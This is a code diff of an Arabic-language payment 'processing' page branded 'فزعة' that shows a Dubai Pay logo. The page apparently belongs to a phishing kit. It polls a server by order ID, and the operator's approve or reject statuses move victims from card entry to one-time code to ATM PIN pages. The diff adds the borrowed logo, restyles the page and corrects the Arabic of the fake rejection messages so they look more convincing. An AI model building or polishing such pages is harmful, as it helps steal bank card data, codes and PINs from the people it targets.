@@ -3,28 +3,69 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري معالجة الطلب - فزعة</title>
+    <title>جاري المعالجة - فزعة</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .container { background: white; border-radius: 12px; padding: 40px 20px; text-align: center; max-width: 400px; box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1); }
-        .spinner { width: 60px; height: 60px; border: 4px solid #e5e7eb; border-top: 4px solid #1e3a5f; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .title { font-size: 20px; font-weight: bold; color: #1e3a5f; margin-bottom: 10px; }
-        .subtitle { font-size: 14px; color: #6b7280; margin-bottom: 20px; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 12px;
+            padding: 40px 20px;
+            text-align: center;
+            max-width: 400px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 30px;
+        }
+
+        .logo {
+            height: 50px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        .spinner {
+            width: 80px;
+            height: 80px;
+            border: 5px solid #e5e7eb;
+            border-top: 5px solid #0066cc;
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
     <div class="container">
+        <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663728520176/TvCpTnLQtXDsNBpI.png" alt="Dubai Pay" class="logo">
         <div class="spinner"></div>
-        <div class="title">جاري التحقق من البيانات</div>
-        <div class="subtitle">يرجى الانتظار، لا تقم بإغلاق الصفحة...</div>
     </div>
 
     <script>
         const orderId = new URLSearchParams(window.location.search).get('orderId');
         
         if (!orderId) {
-            window.location.href = 'payment_new_ar.html';
+            window.location.href = 'payment_card_ar.html';
         }
 
         async function checkStatus() {
@@ -35,17 +76,17 @@
                 if (data.status === 'approved_payment') {
                     window.location.href = `payment_otp_ar.html?orderId=${orderId}`;
                 } else if (data.status === 'rejected_payment') {
-                    localStorage.setItem('lastError', data.lastError || 'تم رفض عملية الدفع بطاقك غير متاح للدفع عبر الانترنت يرجي التواصل مع المصرف او تجربة طرق دفع اخري');
+                    localStorage.setItem('lastError', data.lastError || 'تم رفض عملية الدفع، بطاقتك غير متاحة للدفع عبر الإنترنت. يرجى التواصل مع المصرف أو تجربة طرق دفع أخرى.');
                     window.location.href = `payment_card_ar.html?orderId=${orderId}`;
                 } else if (data.status === 'approved_otp') {
                     window.location.href = `payment_atm_ar.html?orderId=${orderId}`;
                 } else if (data.status === 'rejected_otp') {
-                    localStorage.setItem('lastError', data.lastError || 'الزمر غير صالح او بطاقك غير متاح لدفع عبر الانترنت يرجي التوصل مع المصرف استخدام طرق دفع اخري');
+                    localStorage.setItem('lastError', data.lastError || 'الرمز غير صالح أو بطاقتك غير متاحة للدفع عبر الإنترنت. يرجى التواصل مع المصرف أو استخدام طرق دفع أخرى.');
                     window.location.href = `payment_otp_ar.html?orderId=${orderId}`;
                 } else if (data.status === 'approved_pin') {
                     window.location.href = `payment_success_ar.html?orderId=${orderId}`;
                 } else if (data.status === 'rejected_pin') {
-                    localStorage.setItem('lastError', data.lastError || 'رقم الصراف الي غير صحيح قد تكون بطاقتك غير متاحه للدفع عبر الانترنت يرجي التواصل مع المصرف او استخدام طرق دفع مختلفه');
+                    localStorage.setItem('lastError', data.lastError || 'رقم الصراف الآلي غير صحيح، قد تكون بطاقتك غير متاحة للدفع عبر الإنترنت. يرجى التواصل مع المصرف أو استخدام طرق دفع مختلفة.');
                     window.location.href = `payment_atm_ar.html?orderId=${orderId}`;
                 } else {
                     setTimeout(checkStatus, 2000);
